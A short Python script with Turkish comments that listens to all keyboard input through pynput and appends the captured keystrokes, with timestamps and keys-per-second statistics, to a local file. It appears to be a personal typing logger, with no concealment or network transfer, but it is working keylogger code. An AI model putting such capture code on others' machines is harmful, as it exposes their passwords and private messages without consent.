from pynput import keyboard
import atexit
from time import time as get_time
from datetime import datetime
import logging

# Compose key'ler çalışmıyor :/
# ALT GR kombinasyonları vs.

LOG_FILE = "keyLog.txt"
DELIM = "|"
TIME_LIMIT = 20 * 60

start_time = get_time()
pressedKeys = []

def calculate_time():
    global start_time
    return get_time() - start_time

def reset():
    global pressedKeys, start_time
    pressedKeys.clear()
    start_time = get_time()

def log(log_dir = ""):
    logging.basicConfig(handlers=[logging.FileHandler(log_dir + LOG_FILE, "a+", "utf-8")], level=logging.DEBUG, format='%(asctime)s: %(message)s')

# calculate neden 0 veriyor 🤔
def save_to_file(passing_time = None):
    global pressedKeys

    if passing_time is None:
        passing_time = calculate_time()

    with open(LOG_FILE, "a+", encoding="utf-8") as file:
        lines = []
        lines.append(f"\n\n\n\n")
        lines.append(f"Tarih (Yıl-Ay-Gün Saat-Dakika-Saniye.): {datetime.now()}")
        lines.append(f"Geçen süre (s):                         {passing_time}")
        lines.append(f"Basılan karakter:                       {len(pressedKeys)}")
        lines.append(f"Saniye başı tuş basımı (key/s):         {len(pressedKeys) / passing_time}")
        lines.append(f"\n")
        lines.append("|".join(pressedKeys))

        file.write("\n".join(lines))

    reset()
    

def on_press(key):
    global pressedKeys

    char = None
    try:
        char = key.char
    except AttributeError:
        char = str(key)

    pressedKeys.append(char)

    time = calculate_time()
    if time > TIME_LIMIT:
        save_to_file(time)

def on_release(key):
    if key == keyboard.Key.end:
        save_to_file()

atexit.register(save_to_file)

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
